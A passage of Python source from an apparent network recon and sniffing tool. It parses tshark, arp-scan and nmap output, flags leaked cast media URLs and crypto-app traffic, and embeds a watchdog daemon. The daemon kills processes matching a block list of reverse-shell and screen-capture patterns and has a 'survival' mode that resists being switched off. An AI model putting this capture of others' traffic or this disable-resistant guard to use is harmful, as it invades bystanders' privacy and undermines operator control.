            ["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5
        ).stdout
        words = out.split()
        if "dev" in words:
            return words[words.index("dev") + 1]
    except Exception:
        pass
    return "wlan0"


def local_subnet():
    """CIDR of whatever network the laptop is on, discovered live."""
    try:
        iface = default_iface()
        out = subprocess.run(
            ["ip", "-4", "addr", "show", "dev", iface], capture_output=True, text=True, timeout=5
        ).stdout
        m = re.search(r"inet\s+([\d.]+/\d+)", out)
        if m:
            return str(ipaddress.ip_interface(m.group(1)).network)
    except Exception:
        pass
    return None


IP_RE = re.compile(r"(\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?)")
DOMAIN_RE = re.compile(r"([a-z0-9-]+(?:\.[a-z0-9-]+)+)")
SNIFF_KW = ("traffic", "eyes", "watch", "listen", "sniff", "capture", "monitor", "wire", "phone", "airplay", "cast")
PENTEST_KW = ("hack", "exploit", "attack", "vuln", "brute", "pentest", "break", "crack", "pwn")
RECON_KW = ("scan", "map", "find", "discover", "enumerate", "look", "recon", "probe", "who", "osint")


def parse_intent(text):
    """Turn plain language into (role, target). Target auto-detects if missing."""
    t = text.lower()
    role = "recon"
    if "all eyes" in t or t.startswith("eyes on"):
        role = "eyes"
    elif any(k in t for k in PENTEST_KW):
        role = "pentest"
    elif any(k in t for k in SNIFF_KW):
        role = "sniff"
    elif any(k in t for k in RECON_KW):
        role = "recon"
    target = None
    m = IP_RE.search(t)
    if m:
        target = m.group(1)
    else:
        m = DOMAIN_RE.search(t)
        if m:
            target = m.group(1)
    if not target:
        target = local_subnet() or "127.0.0.1"
    return role, target


def parse_findings(text):
    """Pull IPs / domains out of crow output for clickable results."""
    found = []
    for m in IP_RE.finditer(text):
        if m.group(1).count(".") == 3 and not m.group(1).endswith("/"):
            found.append(m.group(1))
    for m in DOMAIN_RE.finditer(text):
        d = m.group(1).strip(".")
        if "." in d and not d.replace(".", "").isdigit():
            if ".png" in d or d.endswith((".log", ".txt", ".json", ".xml", ".csv", ".svg", ".pcap")):
                continue
            found.append(d)
    seen = set()
    out = []
    for f in found:
        if f not in seen and f != "0.0.0.0":
            seen.add(f)
            out.append(f)
    return out[:40]


def _linkify(s):
    """Turn IPs/domains inside a sentence into click-to-copy anchors."""
    def _rep(m):
        v = m.group(1)
        return f'<a href="upx:{v}">{v}</a>'
    s = re.sub(r"\b(\d{1,3}(?:\.\d{1,3}){3})\b", _rep, s)
    s = re.sub(r"\b([a-zA-Z0-9][a-zA-Z0-9-]*\.(?:com|net|org|io|ai|dev|local|tv|app|co|uk|cloud|xyz|info|me|gg))\b", _rep, s)
    return s


def crow_features(text):
    """Parse a crow transcript into structured telemetry dicts — briefing + triage read the same data."""
    f = {
        "arp": [], "dns": {}, "sni": {}, "mdns": {}, "avahi": {}, "http": {},
        "cast": [], "ports": [], "pcap": None,
        "our_ip": None, "gw": None, "gw_vendor": "", "sniffing": False,
        "dig": {}, "whois": {}, "web": {},
    }
    blocks = re.split(r"^\$ ", text, flags=re.M)
    for blk in blocks:
        head = blk.splitlines()[0] if blk.strip() else ""
        if "arp-scan" in head:
            f["arp"] = re.findall(r"([\d.]+)\t([0-9a-f:]+)\t(.*)", blk)
        elif "dns.qry.name" in head:
            for _t, _ip, name in re.findall(r"(\S+)\t([\d.]+)\t(\S+)", blk):
                if name:
                    f["dns"][name] = f["dns"].get(name, 0) + 1
        elif "tls.handshake" in head:
            for _t, _ip, name in re.findall(r"(\S+)\t([\d.]+)\t(\S+)", blk):
                if name:
                    f["sni"][name] = f["sni"].get(name, 0) + 1
        elif "mdns or ssdp or llmnr" in head:
            for cm in re.finditer(r"([A-Z_]+)\._?tcp\.local|_([a-z0-9_-]+) ", blk, re.I):
                svc = (cm.group(1) or cm.group(2) or "").strip("_")
                if svc:
                    f["mdns"][svc] = f["mdns"].get(svc, 0) + 1
        elif "avahi-browse" in head:
            for m in re.finditer(r"(?:=\s*)?([^=\n]+?)\s+_(\w+)\._tcp", blk):
                inst = m.group(1).strip()
                inst = re.sub(r"^\S+\s+", "", inst)          # strip iface token
                inst = re.sub(r"^IPv[46]\s+", "", inst)       # strip stack label
                if inst and not inst.startswith("="):
                    f["avahi"][inst] = f["avahi"].get(inst, 0) + 1
            for txt in re.findall(r'\[([^\]]*)\]', blk):
                for kv in re.findall(r'"([^"]+)"', txt) or txt.split(" "):
                    if "=" in kv and kv.split("=")[0] in ("fn", "sn", "am", "md", "model", "DeviceName", "Ctx"):
                        f["avahi"][kv.split("=", 1)[1].strip()] = f["avahi"].get(kv.split("=", 1)[1].strip(), 0) + 1
        elif " -Y 'http'" in head:
            for parts in blk.splitlines()[1:]:
                cells = parts.split("\t")
                if len(cells) < 3:
                    continue
                for v in cells[2:]:
                    s = v.strip()
                    if not s:
                        continue
                    m = re.search(r"{(['\"])https?://\S+?\1", s) or re.search(r"https?://(\S+)", s)
                    if m:
                        url = m.group(0).strip("{}'\",")
                        if url not in f["cast"]:
                            f["cast"].append(url)
                    uri = re.search(r"/apps/([A-Za-z0-9.]+)", s) or re.search(r"GET\s+(\S+)\s+HTTP", s)
                    if uri:
                        f["http"][uri.group(1)] = f["http"].get(uri.group(1), 0) + 1
        elif "nmap" in head and " -oA " in head:
            for pm in re.finditer(r"(\d+)/(tcp|udp)\s+open\s+(\S+)", blk):
                f["ports"].append((pm.group(1), pm.group(2), pm.group(3)))
        elif "dig " in head:
            for m in re.finditer(r"\bIN\s+(?:A|AAAA)\s+([0-9a-f:.]+)", blk):
                f["dig"].setdefault("ips", []).append(m.group(1))
            for m in re.finditer(r"\bIN\s+SOA\s+([^\s.]+(?:\.[^\s.]+)+)", blk):
                f["dig"].setdefault("ns", []).append(m.group(1).rstrip("."))
        elif "whois " in head:
            rm = re.search(r"(?im)^\s*Registrar:\s*(.+)$", blk)
            if rm:
                f["whois"]["registrar"] = rm.group(1).strip()
            cm = re.search(r"(?im)^\s*Creation Date:\s*(.+)$", blk)
            if cm:
                f["whois"]["created"] = cm.group(1).strip()
        elif "curl " in head:
            sm = re.search(r"(?im)^HTTP/\S+\s+(\d+)", blk)
            if sm:
                f["web"]["status"] = sm.group(1)
            sv = re.search(r"(?im)^server:\s*(.+)$", blk)
            if sv:
                f["web"]["server"] = sv.group(1).strip()
            f["web"]["hsts"] = "strict-transport-security" in blk.lower()
        elif " -w " in head:
            m = re.search(r"(\d+) packets captured", blk)
            if m:
                f["pcap"] = int(m.group(1))
    f["sniffing"] = any(("tshark" in b.splitlines()[0]) for b in blocks if b.strip())
    for m in re.finditer(r"IPv4: ([\d.]+)", text):
        f["our_ip"] = m.group(1)
    if f["arp"]:
        f["gw"] = f["arp"][0][0]
        f["gw_vendor"] = (f["arp"][0][2] or "unknown").strip(" ()")
    return f


def human_brief(text):
    """Translate raw crow transcript into plain-English analyst notes."""
    f = crow_features(text)
    dns, sni = f["dns"], f["sni"]
    lines = []
    gw = f["gw"]
    if gw:
        lines.append(f"network: gateway is {gw} ({f['gw_vendor']}) — your laptop is {f['our_ip'] or '??'}.")
        if gw.startswith("172.20.10."):
            lines.append("connection: looks like an iPhone/macOS personal hotspot — Apple's classic 172.20.10.x tether range.")
        elif gw.startswith("192.168.43.") or gw.startswith("192.168.42."):
            lines.append("connection: looks like an Android phone hotspot (192.168.4x.x tether range).")
        else:
            lines.append("connection: no phone-tether signature — regular Wi-Fi/LAN router.")
        if len(f["arp"]) > 1:
            names = ", ".join(f"{ip} ({v.strip(' ()') or 'unknown'})" for ip, _, v in f["arp"][1:])
            lines.append(f"devices seen on the segment: {names}.")
    else:
        lines.append("network: no arp results captured on this run (target may be a subnet through a router).")

    if dns:
        top = ", ".join(f"{d} ×{c}" for d, c in sorted(dns.items(), key=lambda kv: -kv[1])[:8])
        if any("api." in d for d in dns) or len(dns) <= 3:
            lines.append(f"what it was doing: the phone's resolver answered queries for {top}.")
            if "kraken" in text.lower():
                lines.append("interesting: repeated calls to a crypto exchange api — looks like a trading app was polling live prices.")
        else:
            lines.append(f"dns queries (domains resolved): {top}.")
    if sni:
        top = ", ".join(f"{d} ×{c}" for d, c in sorted(sni.items(), key=lambda kv: -kv[1])[:8])
        lines.append(f"tls connections (server names in the clear): {top}.")
    if f["avahi"]:
        names = ", ".join(f"{n}×{c}" if c > 1 else n for n, c in list(sorted(f["avahi"].items(), key=lambda kv: -kv[1]))[:6])
        lines.append(f"casting devices/named services on the segment: {names}.")
    if f["mdns"]:
        svcs = ", ".join(f"{s} ×{c}" for s, c in sorted(f["mdns"].items(), key=lambda kv: -kv[1])[:6])
        lines.append(f"casting/device chatter (mdns/ssdp/llmnr): {svcs}.")
    if f["http"]:
        top = ", ".join(f"{h} ×{c}" for h, c in sorted(f["http"].items(), key=lambda kv: -kv[1])[:8])
        lines.append(f"cast control http (dial/chromecast app launches): {_linkify(top)}.")
    if f["cast"]:
        for u in f["cast"][:5]:
            lines.append(f"media url carried in the clear: {u}")
    if f["ports"]:
        ports = ", ".join(f"{p}/{proto} {svc}" for p, proto, svc in sorted(set(f["ports"])))
        lines.append(f"open gateway ports: {ports}.")
    if f["pcap"]:
        lines.append(f"evidence: {f['pcap']} packets saved to a pcap — open it in Wireshark to deep-dive.")
    if f["pcap"] or f["sniffing"]:
        lines.append("read-out: all of the above is metadata — traffic direction, cast announcements, dns names, "
                     "tls server names. the page content itself stayed encrypted inside those tunnels.")
    if not dns and not sni and not f["mdns"] and not f["arp"] and not f["avahi"] and not f["cast"]:
        lines.append("quiet network this window — no hosts answering, no queries, no cast announcements.")
    return lines


FINANCE_RE = re.compile(
    r"kraken|coinbase|binance|finance|bank|paypal|stripe|wise|revolut|cashapp|cash\.app|robinhood|etoro|okx|bybit|gemini",
    re.I,
)
DYN_TLDS = ("xyz", "top", "click", "link", "gq", "ml", "cf", "ga", "tk", "icu", "cyou", "tickets", "coin")
UNUSUAL_PORTS = {80, 443, 22, 53, 21, 23, 25, 445, 8080, 8443}


def _noblank(container):
    return sorted(container.items(), key=lambda kv: -kv[1])


def triage(f):
    """Rank telemetry the way a senior would — SOC 5x5x5 (what fired / who / how unusual / can it be ruled out)
    scored against the pyramid of pain, so behavioral signals outrank plain indicators."""
    names = dict(f["dns"])
    for d, c in f["sni"].items():
        names[d] = max(names.get(d, 0), c)
    hits = []

    if f["cast"]:
        host = re.sub(r"^https?://", "", f["cast"][0]).split("/")[0]
        hits.append({
            "id": "cast-media", "score": 72, "conf": 90,
            "what": f"media url crossed the wire in clear text — {f['cast'][0]}",
            "why": "highest-signal leak on a home network: stream ids, titles and host are visible with zero decryption",
            "so": "confirm the title/stream behind that url — it is the one thing you can actually read.",
            "next": f"curl -sIL {f['cast'][0]}",
            "url": f["cast"][0],
            "host": host,
        })

    if names:
        d, c = _noblank(names)[0]
        if c >= 5:
            hits.append({
                "id": "beacon-repeat", "score": 50, "conf": 65,
                "what": f"one domain hammered {c}× — {d}",
                "why": "steady repetition of a single name is exactly what beacons and api pollers both look like",
                "so": "decide between app-polling and beaconing before calling it C2.",
                "next": f"dig {d} any +noall +answer",
                "domain": d,
            })

    fin = [d for d in names if FINANCE_RE.search(d)]
    if fin:
        hits.append({
            "id": "finance", "score": 64, "conf": 85,
            "what": f"finance/crypto api in play — {fin[0]}",
            "why": "a trading/banking app is live-polling prices; it sets the clock on every other signal",
            "so": "profile the api host so later look-alike queries on this network stand out.",
            "next": f"whois {fin[0]}",
            "domain": fin[0],
        })

    unusual = [p for p in f["ports"] if int(p[0]) >= 49152 or int(p[0]) not in UNUSUAL_PORTS]
    if unusual:
        p = unusual[0]
        hits.append({
            "id": "odd-port", "score": 62, "conf": 60,
            "what": f"gateway answering on unusual port {p[0]}/{p[1]} ({p[2]})",
            "why": "phone hotspots expose almost nothing — an odd open port is the exception a senior chases first",
            "so": "one directed service probe tells open-vs-wrapped and usually the app behind it.",
            "next": f"nmap -Pn -sV -p {p[0]} {f['gw'] or '{target}'}",
            "port": p[0],
        })

    dyn = [d for d in names if (d.rsplit(".", 1)[-1] or "").lower() in DYN_TLDS]
    if dyn:
        hits.append({
            "id": "dyn-tld", "score": 70, "conf": 55,
            "what": f"fresh/throwaway-TLD name resolved — {dyn[0]}",
            "why": "cheap short-life domains sit at the cheap end of the pyramid: fast to spin, hard to trace, common in malware",
            "so": "resolution + registration check decides between a real app and a one-shot callback.",
            "next": f"dig {dyn[0]} any +short",
            "domain": dyn[0],
        })

    if any("raop" in s or "airplay" in s or "googlecast" in s for s in list(f["mdns"]) + list(f["avahi"])):
        hits.append({
            "id": "cast-buzz", "score": 40, "conf": 85,
            "what": "media devices announcing themselves (airplay / chromecast chatter)",
            "why": "confirms a screen-mirror setup lives here — and that phone screen/audio is one hop from this capture",
            "so": "ties to the cast-media finding as soon as media actually streams.",
            "next": None,
        })

    apps = [k for k in f["http"] if k.startswith("/apps/")]
    other = [k for k in f["http"] if not k.startswith("/apps/")]
    if apps:
        hits.append({
            "id": "dial", "score": 48, "conf": 80,
            "what": f"cast-control http (dial/chromecast app launches): {', '.join(apps)}",
            "why": "DIAL launches streams over plain http — the 'what are they watching' answer is in the metadata",
            "so": "cross-check with the media-url finding for the actual stream target.",
            "next": None,
        })
    if other:
        hits.append({
            "id": "http-sig", "score": 42, "conf": 70,
            "what": f"plain http app traffic: {', '.join(other[:3])}",
            "why": "cleartext paths leak app behavior — shop, stream, auth, update — without any decryption",
            "so": "cheap to confirm: it is whatever app the path pattern belongs to.",
            "next": None,
            "paths": ", ".join(other[:3]),
        })

    if f.get("whois") and f["whois"].get("registrar"):
        w = f["whois"]
        hits.append({
            "id": "whois-owner", "score": 18, "conf": 85,
            "what": f"ownership: {w['registrar']}" + (f" · created {w['created']}" if w.get("created") else ""),
            "why": "registration identity is the senior's attribution answer — who actually maintains the platform",
            "so": "the platform is a registered property, not a shadow; tie it to the app observed polling it.",
            "next": None,
        })
    if f.get("web"):
        server = (f["web"].get("server") or "").lower()
        st = f["web"].get("status", "?")
        if "cloudflare" in server:
            hits.append({
                "id": "edge-only", "score": 12, "conf": 90,
                "what": f"api fronts via cloudflare edge (HTTP {st}, server {f['web'].get('server')}, TLS/HSTS{' on' if f['web'].get('hsts') else '?'})",
                "why": "the origin IP hides behind a reverse proxy — passive profiling cannot see past the edge",
                "so": "a live, hardened property confirmed; deeper fingerprinting needs the edge, not the wire.",
                "next": None,
            })
    if f.get("dig") and f["dig"].get("ips"):
        ips = ", ".join(sorted(set(f["dig"]["ips"]))[:3])
        ns = ""
        if f["dig"].get("ns"):
            ns = " · soa " + ", ".join(sorted(set(f["dig"]["ns"]))[:2])
        hits.append({
            "id": "resolved-live", "score": 10, "conf": 85,
            "what": f"domain resolves live ({ips}){ns}",
            "why": "live A records behind an authoritative chain mean a working service, not a parked or dead name",
            "so": "lookup closes the C2-vs-app question for this target: a real platform behind a CDN.",
            "next": None,
        })

    if not hits:
        hits.append({
            "id": "quiet", "score": 5, "conf": 90,
            "what": "quiet window — no signal to chase",
            "why": "the honest senior answer is 'watch longer' rather than invent a finding",
            "so": "re-run the watch (or wait out the phone) — absence of proof is not proof of absence.",
            "next": None,
        })

    hits.sort(key=lambda h: -h["score"])
    for i, h in enumerate(hits, 1):
        h["rank"] = i
    return hits


def hypothesis(f, hits, role):
    if not hits:
        return "no telemetry yet — let the crow work."
    t = hits[0]
    return (f"{role.upper()} crow on {f['gw'] or f['our_ip'] or 'target'} — working theory: "
            f"{t['what']}  (score {t['score']}/100, ~{t['conf']}% confidence).  next senior move: {t['so']}")


def sev_color(score):
    """Color scale for a single finding's evidence value."""
    if score >= 80:
        return SEV_CRIT
    if score >= 65:
        return SEV_HIGH
    if score >= 45:
        return SEV_MED
    if score >= 20:
        return SEV_LOW
    return SEV_INFO


def severity_of(hits):
    """Whole-crow verdict level from its top finding — drives the warning badge."""
    score = max((h["score"] for h in hits), default=0)
    if score >= 80:
        return "CRITICAL", score, SEV_CRIT
    if score >= 65:
        return "HIGH", score, SEV_HIGH
    if score >= 45:
        return "MEDIUM", score, SEV_MED
    if score >= 20:
        return "LOW", score, SEV_LOW
    return "WATCH", score, SEV_INFO


def verdict_of(f, hits, role):
    """One-line decision a senior issues at the end of a pass."""
    if not hits:
        return "letting the crow work — verdict pending."
    lvl, score, _ = severity_of(hits)
    t = hits[0]
    if lvl in ("LOW", "WATCH"):
        return f"VERDICT {lvl} ({score}/100) — {t['so']}"
    return f"VERDICT {lvl} ({score}/100) — {t['what']}.  senior move: {t['so']}"


def thread_key(h):
    """Case-thread identity for a finding — one answer per domain/url/port so
    the same finding can't loop back onto itself forever."""
    if h.get("domain"):
        return f"domain|{h['domain'].lower()}"
    if h.get("url"):
        return f"url|{h['url'].lower()}"
    if h.get("port"):
        return f"port|{h['port']}"
    return None


ANTIDOTES = {
    "cast-media": {
        "label": "MEDIA-LEAK",
        "tasks": [
            ("confirm the stream really serves", "curl -sIL {media}"),
            ("who hosts the stream", "whois {host}"),
            ("resolve the stream host", "dig {host} any +noall +answer"),
            ("catch the casting source again (40s)", "tshark -i {iface} -a duration:40 -l -Y 'mdns or ssdp or llmnr or http' -T fields -e frame.time -e ip.src -e _ws.col.Info"),
        ],
    },
    "finance": {
        "label": "FINANCE-PROFILE",
        "tasks": [
            ("registration trail", "whois {root}"),
            ("resolve + records", "dig {domain} any +noall +answer"),
            ("what the api answers", "curl -sI https://{domain}"),
        ],
    },
    "odd-port": {
        "label": "ODD-PORT-PROBE",
        "tasks": [
            ("deep service probe of the port", "nmap -Pn -sV -sC -p {port} {target}"),
            ("socket fingerprint", "nc -zvw2 {target} {port}"),
            ("check for something web-ish", "curl -sI http://{target}:{port}"),
        ],
    },
    "dyn-tld": {
        "label": "THROWAWAY-DOMAIN",
        "tasks": [
            ("resolve the fresh name", "dig {domain} any +short"),
            ("ownership trail", "whois {root}"),
            ("full record pull", "dig {domain} +noall +answer"),
        ],
    },
    "beacon-repeat": {
        "label": "BEACON-CADENCE",
        "tasks": [
            ("resolve the hammered domain", "dig {domain} any +noall +answer"),
            ("re-listen to measure cadence (120s)", "tshark -i {iface} -a duration:120 -l -Y 'dns' -T fields -e frame.time -e ip.src -e dns.qry.name"),
            ("watch the poll rhythm (60s)", "tshark -i {iface} -a duration:60 -l -Y 'tls.handshake.extensions_server_name' -T fields -e frame.time -e ip.src -e tls.handshake.extensions_server_name"),
        ],
    },
    "dial": {
        "label": "CAST-CONTROL-AUDIT",
        "tasks": [
            ("re-audit cast launches (60s)", "tshark -i {iface} -a duration:60 -l -Y 'http' -T fields -e frame.time -e ip.src -e http.host -e http.request.uri"),
            ("which devices are casting", "avahi-browse -a -t -r"),
            ("re-inventory the segment", "arp-scan --localnet"),
        ],
    },
    "http-sig": {
        "label": "CLEARTEXT-PATH-AUDIT",
        "tasks": [
            ("re-capture cleartext paths (60s)", "tshark -i {iface} -a duration:60 -l -Y 'http' -T fields -e frame.time -e ip.src -e http.request.uri"),
            ("record the app path pattern", "echo {paths}"),
        ],
    },
    "cast-buzz": {
        "label": "CAST-FABRIC-MAP",
        "tasks": [
            ("map casting devices", "avahi-browse -a -t -r"),
            ("watch broadcast chatter (45s)", "tshark -i {iface} -a duration:45 -l -Y 'mdns or ssdp or llmnr' -T fields -e frame.time -e ip.src -e _ws.col.Info"),
        ],
    },
    "quiet": {
        "label": "EXTENDED-WATCH",
        "tasks": [
            ("watch longer (3 min dns/tls)", "tshark -i {iface} -a duration:180 -l -Y 'dns or tls.handshake.extensions_server_name' -T fields -e frame.time -e ip.src -e _ws.col.Protocol"),
        ],
    },
}


def registrable(name):
    """Registrable (eTLD+1) domain — whois only covers the registered name,
    so api.kraken.com → kraken.com, models.opencode.ai → opencode.ai."""
    labels = str(name or "").strip(".").split(".")
    if len(labels) <= 2:
        return ".".join(labels)
    tld = labels[-1]
    if len(tld) == 2 and labels[-2] in ("co", "org", "ac", "gov", "net", "edu", "com"):
        return ".".join(labels[-3:])
    return ".".join(labels[-2:])


def antidote_tasks(h, target="127.0.0.1"):
    """Resolve a finding's response playbook into concrete commands (target stays template-able)."""
    tpl = ANTIDOTES.get(h.get("id"), ANTIDOTES["quiet"])
    subs = {
        "{media}": h.get("url") or target,
        "{host}": h.get("host") or target,
        "{domain}": h.get("domain") or target,
        "{root}": registrable(h.get("domain")) or target,
        "{port}": h.get("port") or "80",
        "{paths}": h.get("paths") or "(n/a)",
        "{target}": target,
    }
    tasks = []
    for lbl, cmd in tpl["tasks"]:
        c = cmd
        for k, v in subs.items():
            c = c.replace(k, v)
        tasks.append((lbl, c))
    return tpl["label"], tasks


def find_terminal():
    for name, argv in TERMINALS.items():
        if shutil.which(name):
            return name, argv()
    return None, None


def opencode_version():
    if not shutil.which("opencode"):
        return None
    try:
        out = subprocess.run(
            ["opencode", "--version"], capture_output=True, text=True, timeout=15
        )
        v = (out.stdout or out.stderr).strip().splitlines()
        return v[-1].strip() if v else "unknown"
    except Exception:
        return "unknown"


# ── LIFELINE: the unconscious twin ──────────────────────────────────────────
RAVENHEART_DIR = Path("/tmp/ravenheart")
STATE_PATH = RAVENHEART_DIR / "state.json"
LEDGER_PATH = RAVENHEART_DIR / "events.log"
CONTROL_PATH = RAVENHEART_DIR / "control.json"
PID_PATH = RAVENHEART_DIR / "twin.pid"
WDPID_PATH = RAVENHEART_DIR / "watchdog.pid"
MIRROR_DIR = Path.home() / ".ravenheart"
MCONTROL_PATH = MIRROR_DIR / "control.json"
MWDPID_PATH = MIRROR_DIR / "watchdog.pid"

RAVENHEART_SRC = """#!/usr/bin/env python3
# ravenheart — the unconscious twin + big brother. one job: this host never loses its link,
# and nobody — student or tool — gets to watch its screen, gut its tools, or rewrite its files.
# a separate process on purpose: if the Raven GUI dies, this keeps beating anyway.
import hashlib, json, os, shlex, socket, subprocess, sys, time

RUNTIME = "/tmp/ravenheart"
MIRROR = os.path.expanduser("~/.ravenheart")   # survives an attacker wiping /tmp
MSYNC = MIRROR + "/sync"
STATE = RUNTIME + "/state.json"
LEDGER = RUNTIME + "/events.log"
CONTROL = RUNTIME + "/control.json"
MCONTROL = MIRROR + "/control.json"
PIDF = RUNTIME + "/twin.pid"
WDF = RUNTIME + "/watchdog.pid"
MWDF = MIRROR + "/watchdog.pid"
MANIFEST = MIRROR + "/manifest.json"           # sha256 of every sealed file

BEAT = 2.0
SURV_LOCKED = False
THAWED = False


def shout(cmd, timeout=7):
    try:
        return subprocess.run(cmd, shell=True, timeout=timeout, text=True,
                              capture_output=True).stdout.strip()
    except Exception:
        return ""


def ev(tag, msg):
    line = "[%s] %s: %s\\n" % (time.strftime("%H:%M:%S"), tag, msg)
    for path in (LEDGER, MIRROR + "/events.log"):
        try:
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "a") as f:
                f.write(line)
        except Exception:
            pass


def beat_state(**kw):
    st = {"t": time.strftime("%H:%M:%S"), "ts": int(time.time())}
    st.update(kw)
    tmp = STATE + ".tmp"
    try:
        os.makedirs(RUNTIME, exist_ok=True)
        with open(tmp, "w") as f:
            json.dump(st, f)
        os.replace(tmp, STATE)
    except Exception:
        pass


def load(path):
    try:
        with open(path) as f:
            return json.load(f)
    except Exception:
        return {}


def dump(path, data):
    try:
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w") as f:
            json.dump(data, f)
        return True
    except OSError:
        return False


def survival_on():
    # the mirror is the single source of truth — wiping /tmp does not disarm it
    return bool(load(MCONTROL).get("survival"))


def ctl():
    base = {"auto": True, "resurrect": True, "guard": True,
            "aggressive": True, "opencode": True, "survival": False,
            "threshold": 2}
    base.update(load(MCONTROL))     # mirror first…
    base.update(load(CONTROL))      # …live file wins, then survival is re-checked
    if survival_on():
        # survival means "extreme protective": it does not accept being talked
        # out of guarding by a rewritten control.json
        base.update({"survival": True, "auto": True, "resurrect": True,
                     "guard": True, "aggressive": True, "opencode": True})
    return base


def route():
    out = shout("ip route show default").split()
    dev = gw = None
    if "dev" in out:
        dev = out[out.index("dev") + 1]
    if "via" in out:
        gw = out[out.index("via") + 1]
    return dev, gw


def tcp_ok(host, port=443, timeout=2):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def online():
    # "online" means a real bearer is carrying traffic, not merely 'associated'
    for host in ("1.1.1.1", "8.8.8.8"):
        for port in (443, 53):
            if tcp_ok(host, port, 2):
                return True
    return False


def rtt_ms(host="1.1.1.1"):
    out = shout("ping -q -c 1 -W 2 %s" % shlex.quote(host))
    try:
        return round(float(out.split("= ")[-1].split("/")[0]), 1)
    except Exception:
        return None


def wifi_profile():
    for line in shout("nmcli -t -f NAME,TYPE connection show").splitlines():
        parts = line.split(":")
        if len(parts) == 2 and parts[1].startswith("802-11-wireless"):
            return parts[0]
    return None


def dhcp_renew(dev):
    shout("sudo -n ip link set %s mtu 1500 2>/dev/null" % dev)
    shout("sudo -n dhclient -v -r %s 2>/dev/null; sleep 2; sudo -n dhclient -v %s 2>/dev/null" % (dev, dev))


def heal(dev, strikes):
    shout("iw dev %s set power_save off 2>/dev/null" % dev)
    prof = wifi_profile()
    if strikes == 1:
        ev("WATCH", "missed a beat — rescanning; power-save held off on %s" % dev)
        shout("nmcli device wifi rescan ifname %s 2>/dev/null" % dev)
    elif strikes == 2:
        if prof:
            ev("HEAL", "re-associating saved wifi profile: %s" % prof)
            shout("nmcli device wifi connect %s ifname %s 2>/dev/null" % (shlex.quote(prof), dev))
        else:
            ev("HEAL", "no saved wifi profile — DHCP renew on %s" % dev)
            dhcp_renew(dev)
    elif strikes == 3:
        ev("HEAL", "nmcli reapply on %s" % dev)
        shout("nmcli device reapply %s 2>/dev/null" % dev)
    else:
        ev("HEAL", "hard bounce of %s + DHCP, repeated until it answers" % dev)
        shout("sudo -n ip link set %s down 2>/dev/null; sleep 3; sudo -n ip link set %s up 2>/dev/null" % (dev, dev))
        shout("nmcli device reapply %s 2>/dev/null" % dev)
        if prof:
            shout("nmcli device wifi connect %s ifname %s 2>/dev/null" % (shlex.quote(prof), dev))
        dhcp_renew(dev)
    for alt in shout("ls /sys/class/net").split():
        if alt in ("lo", dev) or not alt.startswith(("wl", "en", "eth")):
            continue
        if shout("cat /sys/class/net/%s/carrier 2>/dev/null" % alt) == "1":
            ev("HEAL", "failover: attaching to %s" % alt)
            shout("nmcli device set %s autoconnect yes 2>/dev/null" % alt)
            shout("nmcli device connect %s 2>/dev/null" % alt)


# ── BIG BROTHER: the unconscious guard ──────────────────────────────────────
# Expel-class = a hand watching this machine (screen capture, keylogs, reverse
# shells, remote pokes). Watch-class = tools that could be used for it; alert
# first, and only expel if they linger while AGGRESSIVE is on.
# ALLOW must be precise — a loose token like "opencode" would whitelist any
# payload path that contains the word. Match on exact binaries/paths instead.
ALLOW = ("raven/app.py", "ravenheart.py", "/.opencode/bin/opencode",
         "opencode serve", "opencode web", "opencode tui", "Xorg", "Xwayland",
         "kwin_wayland", "plasmashell", "pulseaudio", "pipewire", "systemd",
         "NetworkManager", "avahi-daemon", "sshd", "dbus-daemon", "polkitd",
         "chronyd", "timesyncd", "udisksd", "systemd-logind", "accounts-daemon")

EXPELLED = (
    "xwd ", " scrot ", "maim ", " grim ", "grimscape", "flameshot", "spectacle",
    "import -window", "import -screen", "x11vnc", "vncserver", "xvnc", "vino",
    " krfb", "x11grab", "/dev/fb0", "/dev/input/", "keylogger", "pyautogui",
    " bash -i", " sh -i", "/dev/tcp/", " -e /bin/bash", "nc -e", "ncat -e",
    " nc -lvp", "ncat -lvp", "nc -l -p", " socat", " chisel", "meterpreter",
    "msfconsole", "strace -p", "gdb -p", "pspy", "reveal", "socat ",
)

WATCHED = (
    "xdotool", "convert ", "magick ", "binwalk", "foremost", "exiftool",
    "steghide", "pngcheck", "tesseract", "xxd ", " lsof", " inotifywait",
    "tcpdump -r", "capinfos", "wireshark", "tshark -r",
)

CORE_FILES = [
    "/home/a/raven/app.py",
    "/home/a/raven/ravenheart.py",
    "/home/a/raven/SNAPSHOT.md",
]
LATCH_FILES = [  # rewritten => restored from backup (ssh keys are the crown jewels)
    "~/.ssh/authorized_keys",
]
SUSPECT_FILES = [  # rewritten => loud alert, left alone unless AGGRESSIVE
    "~/.bashrc", "~/.zshrc", "~/.profile", "~/.config/opencode/config.json",
    "~/.config/opencode/opencode.json", "~/.config/opencode/opencode.jsonc",
]
WATCH_DIRS = ["~/.config/autostart", "~/.config/opencode", "/etc/systemd/system"]

OFF = {}
INTEGRITY = {}
ACTS = 0
LAST_ACT = ""
LAST_TIMES = {"mom": 0, "oc": 0, "sync": 0}
SAFE_BINS = ("/usr/bin/", "/bin/", "/usr/sbin/", "/sbin/")
SYNC_DIR = RUNTIME + "/sync"
LAIR = RUNTIME + "/lair"


def pscan():
    procs = {}
    for d in os.listdir("/proc"):
        if not d.isdigit():
            continue
        base = "/proc/" + d
        try:
            with open(base + "/cmdline", "rb") as f:
                cmd = f.read().replace(b"\\0", b" ").decode("utf-8", "replace").strip()
            uid = "?"
            try:
                with open(base + "/status") as f:
                    for ln in f:
                        if ln.startswith("Uid:"):
                            uid = ln.split()[1]
                            break
            except Exception:
                pass
            procs[int(d)] = {"cmd": cmd, "uid": uid}
        except Exception:
            continue
    return procs


def kill_proc(pid, uid):
    try:
        os.kill(pid, 9)
        return True
    except ProcessLookupError:
        return True
    except PermissionError:
        return subprocess.run(["sudo", "-n", "kill", "-9", str(pid)],
                              capture_output=True).returncode == 0


def cripple(cmd):
    # lift the malicious kit file(s): take the first non-system path token in
    # the command line (the executable may be the shell; the kit is an arg)
    try:
        toks = shlex.split(cmd)
    except Exception:
        toks = cmd.split()
    hit = ""
    for t in toks:
        if t.startswith("/") and not t.startswith(SAFE_BINS) and os.path.exists(t):
            hit = t
            break
    if hit:
        try:
            os.makedirs(LAIR, exist_ok=True)
